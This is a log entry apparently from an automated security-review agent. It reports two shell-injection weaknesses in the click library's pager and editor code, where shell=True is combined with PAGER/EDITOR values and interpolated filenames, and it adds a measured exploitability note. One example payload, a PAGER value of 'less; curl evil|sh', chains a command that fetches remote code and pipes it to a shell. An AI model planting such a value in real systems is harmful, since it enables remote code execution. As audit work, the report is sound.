2026-11-22 19:07:06 - Agent_20261122190411 - INFO - [+] Agent signaled completion: Reviewed the single CodeQL result (click/subprocess-calls) for `subprocess.Popen(..., shell=True)` in src/click/_termui_impl.py and the surrounding pager/editor code paths.

Findings submitted:
1. src/click/_termui_impl.py:451 (_pipepager) — cmd comes from the `PAGER` environment variable, split with `shlex.split(os.environ.get("PAGER", ""), posix=False)` (line 382) and then passed together with `shell=True`. Because shlex is used with posix=False, quotes are retained in the tokens, and the command is handed to a shell, so shell metacharacters in `PAGER` (e.g. `less; curl evil|sh`) are interpreted by the shell. `shutil.which()`/`Path.resolve()` only normalizes the first token and does not neutralize the injected metacharacters carried in the remaining quoted tokens, allowing command execution when a PAGER value is attacker-influenced (untrusted env propagation, containerized/CI env, or CLI-supplied env).
2. src/click/_termui_impl.py:601 (Editor.edit_files) — `args=f"{editor} {exc_filename}"` with `shell=True`; both the editor string (from explicit `editor=` argument, else `VISUAL`/`EDITOR` env var) and the filenames are interpolated with only double quotes around filenames, so a filename containing `"` or shell metacharacters, or an editor string containing shell metacharacters, results in shell command injection. Reachable from public API `click.edit(..., filename=...)` / `Editor.edit()`.

Note on exploitability: in the common case both PAGER/EDITOR and the filenames are controlled by the local user invoking their own CLI, so this is primarily a design/hardening weakness (shell=True with string interpolation) rather than a clear remote privilege boundary crossing. Exploitability becomes real when a CLI application passes untrusted values (env-derived config, file names from external input) into `click.edit`/`echo_via_pager`.
